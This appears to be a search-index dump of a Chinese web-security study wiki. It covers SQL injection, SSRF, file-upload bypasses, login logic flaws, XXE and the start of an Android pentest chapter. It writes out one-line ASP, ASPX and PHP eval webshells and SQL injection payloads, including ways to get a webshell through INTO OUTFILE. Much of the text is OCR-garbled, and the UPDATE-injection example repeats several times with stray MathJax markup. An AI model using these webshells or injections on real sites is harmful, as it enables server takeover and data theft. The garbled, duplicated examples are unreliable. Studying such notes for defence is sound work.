.pcntl. exec(. popen),proc open) \u9632\u62a4 \u53c2\u6570\u5316\u67e5\u8be2 18\u3001\u5bbd\u5b57\u8282\u6ce8\u5165\u4ea7\u751f\u539f\u7406\u4ee5\u53ca\u6839\u672c\u539f\u56e0 1)\u4ea7\u751f\u539f\u7406:\u5728\u6570\u636e\u5e93\u4f7f\u7528\u4e86\u5bbd\u5b57\u7b26\u96c6\u800cWEB\u4e2d\u6ca1\u8003\u8651\u8fd9\u4e2a\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\uff0c\u7531 \u4e8e0XBF27\u662f\u4e24\u4e2a\u5b57\u7b26\uff0c\u5728PHP\u4e2dadcslash\u548cmagic _quotes. gpc\u5f00\u542f\u65f6\uff0c\u4f1a\u5bf9 0x27\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u56e0\u6b640xbf27\u4f1a\u53d8\u62100xbf5c27\u3002 \u800c\u6570\u636e\u8fdb\u5165\u6570\u636e\u5e93\u4e2d\u65f6\uff0c\u7531\u4e8e0XBF5C\u662f\u4e00-\u4e2a\u53e6\u5916\u7684\u5b57\u7b26\uff0c\u56e0\u6b64\\\u8f6c\u4e49\u7b26\u53f7\u4f1a\u88ab \u524d\u9762\u7684bf\u5e26\u7740\"\u5403\u6389\"\uff0c\u5355\u5f15\u53f7\u7531\u6b64\u9003\u9038\u51fa\u6765\u53ef\u4ee5\u7528\u6765\u95ed\u5408\u8bed\u53e5\u3002 2)\u6839\u672c\u539f\u56e0: character. set _lient(\u5ba2 \u6237\u7aef\u7684\u5b57\u7b26\u96c6)\u548ccharacter. set connection(\u8fde\u63a5\u5c42\u7684\u5b57\u7b26 \u96c6)\u4e0d\u540c,\u6216\u8f6c\u6362\u51fd\u6570\u5982\uff0ciconv\u3001 mb. convert. encoding\u4f7f\u7528\u4e0d\u5f53\u3002 \u89e3\u51b3\u529e\u6cd5:\u7edf\u4e00\u6570\u636e\u5e93\u3001Web\u5e94\u7528\u3001\u64cd\u4f5c\u7cfb\u7edf\u6240\u4f7f\u7528\u7684\u5b57\u7b26\u96c6\uff0c\u907f\u514d\u89e3\u6790\u4ea7 \u751f\u5dee\u5f02\uff0c\u6700\u597d\u90fd\u8bbe\u7f6e\u4e3aU1F-8\u3002\u6216\u5bf9\u6570\u636e\u8fdb\u884c\u6b62\u786e\u7684\u8f6c\u4e49\uff0c\u5982 mysql real escape string +mysql set charset\u7684\u4f7f\u7528\u3002 19\u3001mysql \u7684\u7f51\u7ad9\u6ce8\u51655.0\u4ee5\u4e0a\u548c5.0\u4ee5\u4e0b\u6709\u4ec0\u4e48\u533a\u522b 5.0\u4ee5\u4e0b\u6ca1\u6709information. schema\u8fd9\u4e2a\u7cfb\u7edf\u8868\uff0c\u65e0\u6cd5\u5217\u8868\u540d\u7b49.\u53ea\u80fd\u66b4\u529b\u8dd1\u8868\u540d: 5.0\u4ee5\u4e0b\u662f\u591a\u7528\u6237\u5355\u64cd\u4f5c\uff0c5.0\u4ee5_ \u4e0a\u662f\u591a\u7528\u6237\u591a\u64cd\u4f5c\u3002 30\u3001Sqlmap \u5e38\u7528\u53c2\u6570 -u (\u6307\u5b9aur) \u300c(\u8bfb\u53d6\u9700\u8981\u6ce8\u5165\u7684post\u8bf7\u6c42\u7684\u6587\u672c) -m (\u6279\u91cf\u8dd1get\u6ce8\u5165) -P (\u6307\u5b9a\u6ce8\u5165\u53c2\u6570) -current-do: (\u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93) -table (\u679a\u4e3e\u6570\u636e\u5e93\u8868) \u201c-amper (\u4f7f\u7528\u8fc7 waf\u811a\u672c) 36\u3001\u53d1\u73b0demo.Jsp?uid=110\u6ce8\u5165\u70b9\uff0c\u4f60\u6709\u54ea\u51e0\u79cd\u601d\u8def\u83b7\u53d6webshell,\u54ea\u79cd\u662f \u4f18\u9009 \u6709\u5199\u5165\u6743\u9650\u7684\uff0c\u6784\u9020\u8054\u5408\u67e5\u8be2\u8bed\u53e5\u4f7f\u7528using INTO OUTFILE,\u53ef\u4ee5\u5c06\u67e5\u6d35\u7684\u8f93\u51fa \u91cd\u5b9a\u5411\u5230\u7cfb\u7edf\u7684\u6587\u4ef6\u4e2d\uff0c\u8fd9\u6837\u53bb\u5199\u5165WeEShell\u4f7f\u7528sqlmap - os-shell\u539f\u7406\u548c\u4e0a \u9762\u4e00\u79cd\u76f8\u540c\uff0c\u6765\u76f4\u63a5\u83b7\u5f97\u4e00\u4e2aShell, \u8fd9\u6837\u6548\u7387\u66f4\u9ad8\u3002 \u901a\u8fc7\u6784\u9020\u8054\u5408\u67e5\u8be2\u8bed\u53e5\u5f97\u5230\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u8d26\u6237\u548c\u5bc6\u7801\uff0c\u7136\u540e\u626b\u540e\u53f0\u767b\u5f55\u540e\u53f0\uff0c\u518d \u5728\u540e\u53f0\u901a\u8fc7\u6539\u5305\u4e0a\u4f20\u7b49\u65b9\u6cd5\u4e0a\u4f20Shell\u3002 7)\u4e0d\u5141\u8bb8\u63d0\u4f9b\u76ee\u5f55\u904d\u5386\u670d\u52a1 8)\u516c\u5f00\u6587\u4ef6\u53ef\u653e\u7f6e\u5728weD\u5e94\u7528\u7a0b\u5e8f\u4e0b\u8f7d\u76ee\u5f55\u4e2d\u901a\u8fc7\u94fe\u63a5\u8fdb\u884c\u4e0b\u8f7d 41\u3001SQL\u91cc\u9762\u53ea\u6709update\u600e\u4e48\u5229\u7528 \u5148\u7406\u89e3\u8fd9\u53e5SQL: UPDATE user sET password='MD5( password)\uff0c nomepage= homepage' WHERE id='id\" \u5982\u679c\u6b64SQL\u88ab\u4fee\u6539\u6210\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u5c31\u5b9e\u73b0\u4e86\u6ce8\u5165\u3002 1)\u4fee\u6539homepage\u503c\u4e3ahtpper. uereve=*3 \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET paswordra'mypass homepage=' ht:xx net', userlevel='3' WHERE id=' homepage' WHERE id='id\" \u5982\u679c\u6b64SQL\u88ab\u4fee\u6539\u6210\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u5c31\u5b9e\u73b0\u4e86\u6ce8\u5165\u3002 1)\u4fee\u6539homepage\u503c\u4e3ahtpper. uereve=*3 \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET paswordra'mypass homepage=' ht:xx net', userlevel='3' WHERE id=' id\" userlevel\u4e3a\u7528\u6237\u7ea7\u522b 2)\u4fee\u6539password\u503c\u4e3amypass)' WHERE username= admin'# \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password= \"MD5(mypass)' WHERE username= 'admin'#), homepage='id\" userlevel\u4e3a\u7528\u6237\u7ea7\u522b 2)\u4fee\u6539password\u503c\u4e3amypass)' WHERE username= admin'# \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password= \"MD5(mypass)' WHERE username= 'admin'#), homepage=' password)\uff0c nomepage= <span class=\"arithmatex\"><span class=\"MathJax_Preview\">homepage' WHERE id='id\" \u5982\u679c\u6b64SQL\u88ab\u4fee\u6539\u6210\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u5c31\u5b9e\u73b0\u4e86\u6ce8\u5165\u3002 1)\u4fee\u6539homepage\u503c\u4e3ahtpper. uereve=*3 \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET paswordra'mypass homepage=' ht:xx net', userlevel='3' WHERE id='</span><script type=\"math/tex\">homepage' WHERE id='id\" \u5982\u679c\u6b64SQL\u88ab\u4fee\u6539\u6210\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u5c31\u5b9e\u73b0\u4e86\u6ce8\u5165\u3002 1)\u4fee\u6539homepage\u503c\u4e3ahtpper. uereve=*3 \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET paswordra'mypass homepage=' ht:xx net', userlevel='3' WHERE id=' id\" userlevel\u4e3a\u7528\u6237\u7ea7\u522b 2)\u4fee\u6539password\u503c\u4e3amypass)' WHERE username= admin'# \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password= \"MD5(mypass)' WHERE username= 'admin'#), homepage='id\" userlevel\u4e3a\u7528\u6237\u7ea7\u522b 2)\u4fee\u6539password\u503c\u4e3amypass)' WHERE username= admin'# \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password= \"MD5(mypass)' WHERE username= 'admin'#), homepage=' romepage' WHERE id=' id' 3)\u4fee\u6539id\u503c\u4e3aOR username= 'admin \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password=\"MD5( id' 3)\u4fee\u6539id\u503c\u4e3aOR username= 'admin \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password=\"MD5( password)'; homepage= $homepage' WHERE id=\" OR username=' admin'","title":"SQL\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#ssrf","text":"\u56e0\u4e3aSSRF\u6f0f\u6d1e\u662f\u8ba9\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u901a\u8fc7\u6293\u5305\u5206\u6790\u53d1\u9001 \u7684\u8bf7\u6c42\u662f\u5426\u662f\u7531\u670d\u52a1\u5668\u6240\u53d1\u9001\u7684\uff0c\u4ece\u800c\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728SSRF\u6f0f\u6d1e;\u6cd5\u5df2\u5f53\u4e0d\u884c \u5728\u9875\u9762\u6e90\u7801\u4e2d\u67e5\u627e\u8bbf\u95ee\u7684\u8d44\u6e90\u5730\u5740\uff0c\u5982\u679c\u8be5\u8d44\u6e90\u5730\u5740\u7c7b\u578b\u4e3a\u8336\u4e1a\u5982\u606f\u4ea4 www.baidu . compxxphp?image= (\u5730\u5740) \u7684\u5c31\u53ef\u80fd\u5b58\u5728SSRF\u6f0f\u6d1e\u3002 \u6210\u56e0:\u6a21\u62df\u670d\u52a1\u5668\u5bf9\u5176\u4ed6\u670d\u52a1\u5668\u8d44\u6e90\u8fdb\u884c\u8bf7\u6c42\uff0c\u6ca1\u6709\u505a\u5408\u6cd5\u6027\u9a8c\u8bc1\u3002 \u5229\u7528:\u6784\u9020\u6076\u610f\u5185\u7f51P\u505a\u63a2\u6d4b\uff0c\u6216\u8005\u4f7f\u7528\u5176\u4f59\u6240\u652f\u6301\u7684\u534f\u8bae\u5bf9\u5176\u4f59\u670d\u52a1\u8fdb\u4eba \u51fb\u3002\u9632\u5fa1:\u7981\u6b62\u8df3\u8f6c\uff0c\u9650\u5236\u534f\u8bae\uff0c\u5185\u5916\u7f51\u9650\u5236\uff0cURL \u9650\u5236\u3002 \u7ed5\u8fc7:\u4f7f\u7528\u4e0d\u540c\u534f\u8bae\uff0c\u9488\u5bf9IP IP\u683c\u5f0f\u7684\u7ed5\u8fc7\uff0c \u9488\u5bf9URL, \u6076\u610fURL\u589e\u5929\uff0c \u5b87\u7b26\uff0c@\u4e4b\u7c7b\u7684\u3002301\u8df3\u8f6c-drs rbindaingo","title":"SSRF"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_4","text":"23\u3001\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u539f\u7406 \u7531\u4e8e\u7a0b\u5e8f\u5458\u5728\u5bf9\u7528\u6237\u6587\u4ef6\u4e0a\u4f20\u90c1\u5206\u7684\u63a7\u5236\u4e0d\u8db3\u6216\u8005\u5904\u7406\u7f3a\u9677\u800c\u5bfc\u81f4\u7528\u6237\u53ef\u4ee5\u8d8a \u8fc7\u5176\u672c\u8eab\u6743\u9650\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u53ef\u6267\u884c\u7684\u52a8\u6001\u811a\u672c\u6587\u4ef6\u3002 24\u3001\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570 PHP: include(). include. once), require(), re-quire. once(), topen), readfile() JSP/Servlet: ava io.Filc(), java.io.Fil- eReader() ASP: include file, include virtual 28\u3001\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7ed5\u8fc7\u65b9\u6cd5 \u524d\u7aefJs\u7ed5\u8fc7\u3001\u9ed1\u767d\u540d\u5355\u7ed5\u8fc7\u3001\u6587\u4ef6\u7c7b\u578b\u7ed5\u8fc7(mime\u3001 \u6587\u4ef6\u5934\u3001\u6587\u4ef6\u5185\u5bb9)\u3001\u8def \u5f84\u622a\u65ad\u7ed5\u8fc7(00 \u622a\u65ad)\u3001\u4e2d\u95f4\u4ef6\u89e3\u6790\u6f0f\u6d1e\u3001\u6761\u4ef6\u7ade\u4e89\u3001\u6b21\u6e32\u67d3 \u3001\u7f16\u8f91\u5668\u6f0f\u6d1e 29\u3001\u6587\u4ef6\u4e0a\u4f20\u9632\u5fa1\u65b9\u6cd5 \u4e0a\u4f20\u76ee\u5f55\u7684\u7528\u6237\u6267\u884c\u6743\u9650\u5168\u90e8\u53d6\u6d88\u3001\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\u3001\u4f7f\u7528\u968f\u673a\u6570\u6539\u5199\u6587\uff0c \u8005\u548c\u7236 \u4ef6\u8def\u5f84\u3001\u7f51\u7ad9\u670d\u52a1\u5668\u548c\u6587\u4ef6\u670d\u52a1\u5668\u5206\u79bb\u3001\u767d\u540d\u5355\u68c0\u67e5\u3001\u9650\u5236\u6587\u4ef6\u5927\u5c0f","title":"\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_5","text":"\u4e3b\u8981\u662f\u6570\u636e\u7684\u7be1\u6539(\u6d89\u53ca \u53ca\u91d1\u878d\u6570\u636e\uff0c\u6216\u90e8\u5206\u4e1a\u52a1\u7684\u5224\u65ad\u6570\u636e)\uff0c\u7531\u7ade\u4e89\u6761\u4ef6\u6216\u8005\u8bbe \u8ba1\u4e0d\u5f53\u5f15\u8d77\u7684\u8584\u7f8a\u6bdb\uff0c\u4ea4\u6613\u95e8\u5355\u4fe1\u601d\u6cc4\u9732\u6c34\u5e73\u8d8a\u4eea\u5bf9\u522b\u4eba\u7684\u8d26\u6237\u67e5\u770b\u6216\u60e0\u610f\u64cd\u4f5c\uff0c\u4ea4\u6613\u6216\u4e1a\u52a1\u6b65\u9aa4\u7ed5\u8fc7\u3002 37\u3001\u8bf4\u51fa\u81f3\u5c11\u4e09\u79cd\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e\uff0c\u4ee5\u53ca\u4fee\u590d\u65b9\u5f0f \u5bc6\u7801\u627e\u56de\u6f0f\u6d1e\u4e2d\u5b58\u5728: 1)\u5bc6\u7801\u5141\u8bb8\u66b4\u529b\u7834\u89e3 2)\u5b58\u5728\u901a\u7528\u578b\u627e\u56de\u51ed\u8bc1 3)\u53ef\u4ee5\u8df3\u8fc7\u9a8c\u8bc1\u6b65\u9aa4 4)\u627e\u56de\u51ed\u8bc1\u53ef\u4ee5\u62e6\u5305\u83b7\u53d6 \u7b49\u65b9\u5f0f\u6765\u901a\u8fc7\u5382\u5546\u63d0\u4f9b\u7684\u5bc6\u7801\u627e\u56de\u529f\u80fd\u6765\u5f97\u5230\u5bc6\u7801\u3002 \u8eab\u4efd\u8ba4\u8bc1\u6f0f\u6d1e\u4e2d\u6700\u5e38\u89c1\u7684\u662f: 5)\u4f1a\u8bdd\u56fa\u5b9a\u653b\u51fb 6)Cookie \u4eff\u5192 \u53ea\u8981\u5f97\u5230Session \u6216Cookie \u5373\u53ef\u4f2a\u9020\u7528\u6237\u8eab\u4efd\u3002 \u9a8c\u8bc1\u7801\u6f0f\u6d1e\u4e2d\u5b58\u5728: 7)\u9a8c\u8bc1\u7801\u5141\u8bb8\u66b4\u529b\u7834\u89e3 8)\u9a8c\u8bc1\u7801\u53ef\u4ee5\u901a\u8fc7Javascipt \u6216\u8005\u6539\u5305\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u7ed5\u8fc7","title":"\u91d1\u878d\u884c\u4e1a\u5e38\u89c1\u903b\u8f91\u6f0f\u6d1e"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_6","text":"xss\uff0c\u5f31\u53e3\u4ee4\uff0csql\u6ce8\u5165\uff0ccms\u6f0f\u6d1e\uff0c\u627e\u56de\u5bc6\u7801\u903b\u8f91\u6f0f\u6d1e\uff0c\u529f\u80fd\u6027\u7684\u903b\u8f91\u6f0f\u6d1e\u7b49\u7b49\u3002 \u627e\u56de\u5bc6\u7801\u5904 1.\u7206\u7834\u9a8c\u8bc1\u7801\uff1a \u5982\u679c\u5f53\u9a8c\u8bc1\u53ea\u67094-5\u4f4d\u5b58\u6570\u5b57 \u7206\u7834\u9a8c\u8bc1\u7801\u7684\u6210\u529f\u7387\u5f88\u9ad8 \uff1a\u6bd4\u5982 100\u4e2a\u7ebf\u7a0b \u7206\u78344\u4f4d\u7684\u4e5f\u5c311\u5206\u591a\u949f\u5c31\u641e\u5b9a\uff1a \u5982\u4f55\u4fee\u590d:\u9a8c\u8bc1\u7801\u9a8c\u8bc1\u5b57\u6570\u9650\u5236\u52a0\u65f6\u95f4\u9650\u5236 2.\u51ed\u8bc1\u5728\u9875\u9762\u4e0a \uff1a\u6bd4\u5982\u4f60\u6700\u540e\u8bbe\u7f6e\u5bc6\u7801\u7684\u65f6\u5019\uff0c url/userid=1234$type=1 \u8fd9\u4e2a\u4f60\u4fee\u6539ID \u5c31\u76f4\u63a5\u53ef\u4ee5\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801\uff1b \u5982\u4f55\u4fee\u590d:\u8bf7\u52ff\u5427\u91cd\u8981\u6570\u636e\u8fd4\u56de\u5ba2\u6237\u7aef or \u6570\u636e\u52a0\u5bc6\u4e0d\u53ef\u9006 3.\u8fd4\u56de\u51ed\u8bc1: \u6709\u65f6\u5019 \u4ed6\u4f1a\u628a\u51ed\u8bc1 \u6bd4\u5982\u9a8c\u8bc1\u7801\u95ee\u9898\u7b54\u6848 \u4e4b\u7c7b\u7684 \u76f4\u63a5\u8fd4\u56de\u5728html \u4ee3\u7801\u91cc or \u6570\u636e\u5305\u4e2d \u4f60\u5c31\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u5bc6\u7801\u4e86 \u5982\u4f55\u4fee\u590d:\u8bf7\u52ff\u5427\u91cd\u8981\u6570\u636e\u8fd4\u56de\u5ba2\u6237\u7aef 4.\u672a\u4e25\u683c\u9a8c\u8bc1\uff1a\u6bd4\u5982\u4f60\u5728\u627e\u56de\u5bc6\u7801\u7684\u65f6\u5019 \u4ed6\u4f1a\u628a\u9a8c\u8bc1\u7801\u53d1\u9001\u90ae\u7bb1 \uff0c\u4f46\u662f\uff0c\u5728\u53d1\u9001\u6570\u636e\u65f6\u5019\uff0c\u4f60\u5c06\u5305\u62e6\u622a\u4e0b\u6765 \u4fee\u6539\u90ae\u7bb1 \u5c31\u53ef\u4ee5\u5427\u9a8c\u8bc1\u7801\u53d1\u9001\u5230\u81ea\u5df1\u7684\u90ae\u7bb1 \u6210\u529f\u7ed5\u8fc7\u90ae\u7bb1 \u5982\u4f55\u4fee\u590d:\u4e25\u683c\u9a8c\u8bc1 \u5728\u53d1\u9001\u90ae\u7bb1\u65f6\u9a8c\u8bc1\u63a5\u6536\u90ae\u7bb1 5.\u672c\u5730\u9a8c\u8bc1\uff1a\u6709\u65f6\u5019\u4ed6\u4f1a\u8fd4\u56de\u7684\u72b6\u6001\u7801 \u8fd8\u6709\u8fd4\u56de\u53c2\u6570\u503c \u5982\u679c\u4f60\u4fee\u6539\u72b6\u6001\u7801\u4e3a200 \u6216\u8005 \u53c2\u6570\u503c\u7b49\u4e8e1 \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1 \u5982\u4f55\u4fee\u590d:\u5efa\u8bae\u670d\u52a1\u7aef\u9a8c\u8bc1 6.token \u53ef\u9006 \uff1a\u6700\u540e\u5728url\u4e0a\u7684\u53c2\u6570 \u7528\u6237ID \u52a0 token \u7ed3\u679c\u4f60\u53d1\u73b0 token \u53ef\u4ee5\u89e3\u5bc6 or \u6709\u89c4\u5f8b \u5c31\u53ef\u4ee5\u4fee\u6539ID \u7b97\u51fatoken \u6210\u529f\u7ed5\u8fc7 \u5982\u4f55\u4fee\u590d:token \u4e0d\u53ef\u9006 \u968f\u673a 7.\u91cd\u65b0\u7ed1\u5b9a \u90ae\u7bb1 or \u624b\u673a \uff1a \u6709\u65f6\u5019\u5728\u6ce8\u518c\u5b8c\u7528\u6237\u540e \u4ed6\u8981\u4f60\u7ed1\u5b9a\u624b\u673a or \u90ae\u7bb1 \u7ed3\u679c\u4f60\u8fd8\u53d1\u73b0 uid \u53ef\u63a7 \u600e\u4e48\u6837\u7ed5\u8fc7 \u6211\u5c31\u4e0d\u8bf4\u4e86\u5427 23333.. \u5982\u4f55\u4fee\u590d:\u7ed1\u5b9a\u65f6\u9a8c\u8bc1\u7528\u6237\u662f\u5426\u4ee5\u53ca\u7ed1\u5b9a \u5426\u5219\u4f1a\u8986\u76d6 \u6570\u636e 23333... 8.\u6743\u9650\u5e73\u884c \uff1a\u6709\u65f6\u5019\u4ed6\u6700\u540e \u9a8c\u8bc1cookie \u800ccookie\u503c&uid=xxxxx ; \u4f60\u4fee\u6539\u540e\u9762\u7684UID \u4e00\u6837\u4e5f\u53ef\u4ee5 \u6709\u65f6\u5019 session \u4e5f\u53ef\u4ee5\u8986\u76d6 \u5982\u4f55\u4fee\u590d:cookie session \u552f\u4e00 2333.. 9.\u6ce8\u518c\u8986\u76d6 :\u6709\u65f6\u5019 \u660e\u660e\u7528\u6237\u5df2\u7ecf\u6ce8\u518c \u4f46\u662f\u4ed6\u662f\u672c\u5730\u8fdb\u884c\u9a8c\u8bc1 \u6709\u65f6\u5019\u52a0\u4e2a\u5305\u4ec0\u4e48\u65f6\u5019\u5c31\u7ed5\u8fc7\u53bb\u4e86 \u7136\u540e\u6dfb\u52a0\u7528\u6237\u6210\u529f\u968f\u4e4b\u8986\u76d6 \u5982\u4f55\u4fee\u590d:\u670d\u52a1\u7aef\u7528\u6237\u662f\u5426\u5df2\u7ecf\u6ce8\u518c \u5982\u679c\u5b58\u5728 \u8fd4\u56defalse ; 10\uff1a\u6ce8\u518c\u5904 \u5b58\u5728sql\u7b49\u5176\u4ed6\u6f0f\u6d1e \u5982\u4f55\u4fee\u590d\uff1a\u8fd9\u4e2a\u6d89\u53ca\u592a\u5e7f\u770b\u5b98\u4eec\u81ea\u5df1\u60f3 2333...","title":"\u767b\u5f55\u6846\u7684"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#xxe","text":"\u539f\u7406: XXE (XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\uff0cXML External Entty)\uff0c\u5728\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML \u8f93\u5165\u65f6\uff0c\u5f53\u5141\u8bb8\u5f15\u7528\u5916\u90e8\u5b9e\u4f53\u65f6\uff0c\u53ef\u6784\u9020\u6076\u610f\u5185\u5bb9\uff0c\u5bfc\u81f4\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3001\u63a2\u6d4b\u5185 \u7f51\u7aef\u53e3\u3001\u653b\u51fb\u5185\u7f51\u7f51\u7ad9\u3001\u53d1\u8d77DoS\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3001\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7b49\u3002 Java\u4e2d\u7684XXE\u652f\u6301sun.net. ww.protcco\u91cc\u7684\u6240\u6709\u534f\u8bae: http. https, fle, ftp. mailto, jar, netdoc, \u4e00 \u822c\u5229\u7528file\u534f\u8bae\u8bfb\u53d6\u6587\u4ef6\uff0c\u5229\u7528http\u534f\u8bae\u63a2\u6d4b\u5185\u7f51\u3002 \u9632\u5fa1:\u914d\u7f6eXML\u5904\u7406\u5668\u4f7f\u7528\u7981\u7528DTD\u3001\u7981\u6b62\u5916\u90e8\u5b9e\u4f53\u89e3\u6790\u3001\u901a\u8fc7\u9ed1\u540d\u5355\u8fc7\u6ee4\u7528 \u6237\u63d0\u4ea4\u7684XML\u6570\u636e\u3002","title":"XXE"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_7","text":"ASP: <%eval request(\"cmd\")%> ASP.NET: (aspx) <%@ Page Language= \"Jscript\"%> <%eval(Request.ltem[\"cmd\"]\"unsafe\");%> PHP: <?php @eval($_ REQUEST['cmd]):?> \u7b80\u8ff0PHP\u4ee3\u7801\u6ce8\u5165\u548c\u547d\u4ee4\u6ce8\u5165\u7684\u6210\u56e0\u548c\u5371\u5bb3 PHP\u4e2deval\u3001aser. call _user. func\u7b49\u51fd\u6570\u4f1a\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5cPHP\u4ee3\u7801\u6267\u884c\uff0c\u65e5\u6c5f \u6709\u5bf9\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\u3002\u5e94\u7528\u5728\u8c03\u7528sytem\u7b49\u51fd\u6570\u65f6\u4f1a\u5c06\u5b57\u7b26\u4e32\u62fc\u63a5\u5230\u547d\u4ee4\u884c\u4e2d \u4e14\u6ca1\u6709\u8fc7\u6ee4\u7528\u6237\u8f93\u4eba\u3002 PHP\u6ce8\u5165\u4f1a\u4f7f\u653b\u51fb\u8005\u6267\u884c\u4efb\u610f\u4ee3\u7801getshel\u4ece\u800c\u63a7\u5236\u7f51\u7ad9\u6216\u670d\u52a1\u5668\u3002\u7cfb\u7edf\u6ce8\u5165\u3002 \u4f7f\u653b\u51fb\u8005\u7ee7\u627fweb\u670d\u52a1\u5668\u7a0b\u5e8f\u6743\u9650\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3001\u8bfb\u5199\u6587\u4ef6\u3001\u53cd\u5f39shell, !\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u7f51\u7ad9\u751a\u81f3\u670d\u52a1\u5668\u3002","title":"\u4e00\u53e5\u8bdd\u6728\u9a6c"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_8","text":"\u914d\u7f6e\u6587\u4ef6\u8bbf\u95ee \u2022 httpd.conf \u2022 htaccess \u2022 HTPASSWD \u2022 boot.ini \u2022 etc/passwd \u2022 Php.ini \u2022 Web.xml","title":"\u4fe1\u606f\u6cc4\u9732"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u79fb\u52a8\u6d4b\u8bd5\u7aef\u5206\u4e3a\u5b89\u5353\u7c7b\u3001ios\u7c7b\u3001\u5c0f\u7a0b\u5e8f\u7c7b \u7b2c\u4e00\u7ae0 Android \u00b6 1.1 Android \u6280\u672f\u6808 \u00b6 Android \u7531\u56db\u4e2a\u5c42\u7ec4\u6210\uff1aLinux \u5185\u6838\uff0c\u672c\u5730\u7528\u6237\u7a7a\u95f4\uff0c\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u548c\u5e94\u7528\u7a0b\u5e8f\u5c42\u3002\u6709\u65f6\u672c\u5730\u7528\u6237\u7a7a\u95f4\u548c\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42\u88ab\u5408\u5e76\u5230\u4e00\u4e2a\u5c42\u4e2d\uff0c\u79f0\u4e3a Android \u4e2d\u95f4\u4ef6\u5c42 Linux \u5185\u6838\u5c42 \u3002\u5728 Android \u4e2d\uff0cLinux \u5185\u6838\u8d1f\u8d23\u8fdb\u7a0b\uff0c\u5185\u5b58\uff0c\u901a\u4fe1\uff0c\u6587\u4ef6\u7cfb\u7edf\u7ba1\u7406\u7b49\u3002\u867d\u7136 Android \u4e3b\u8981\u4f9d\u8d56\u4e8e\u201cvanilla\" Linux \u5185\u6838\u529f\u80fd\uff0c\u4f46\u662f\u5df2\u7ecf\u505a\u51fa\u4e86\u7cfb\u7edf\u64cd\u4f5c\u6240\u9700\u7684\u51e0\u4e2a\u81ea\u5b9a\u4e49\u66f4\u6539\u3002\u5176\u4e2d Binder\uff08\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u5bf9Android \u4e2d\u7684\u81ea\u5b9a\u4e49 RPC / IPC \u673a\u5236\u7684\u652f\u6301\uff09\uff0cAshmem\uff08\u66ff\u4ee3\u6807\u51c6\u7684 Linux \u5171\u4eab\u5185\u5b58\u529f\u80fd\uff09\uff0cWakelocks\uff08\u4e00\u79cd\u9632\u6b62\u7cfb\u7edf\u8fdb\u5165\u7761\u7720\u7684\u673a\u5236\uff09\u662f\u6700\u503c\u5f97\u6ce8\u610f\u7684\u66f4\u6539\u3002\u867d\u7136\u8fd9\u4e9b\u53d8\u5316\u88ab\u8bc1\u660e\u5728\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u975e\u5e38\u6709\u7528\uff0c\u4f46\u5b83\u4eec\u4ecd\u7136\u5728 Linux \u5185\u6838\u7684\u4e3b\u8981\u5206\u652f\u4e4b\u5916\u3002 \u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42 \u3002\u901a\u8fc7\u672c\u5730\u7528\u6237\u7a7a\u95f4\uff0c\u6211\u4eec\u53ef\u4e86\u89e3\u5728 Dalvik 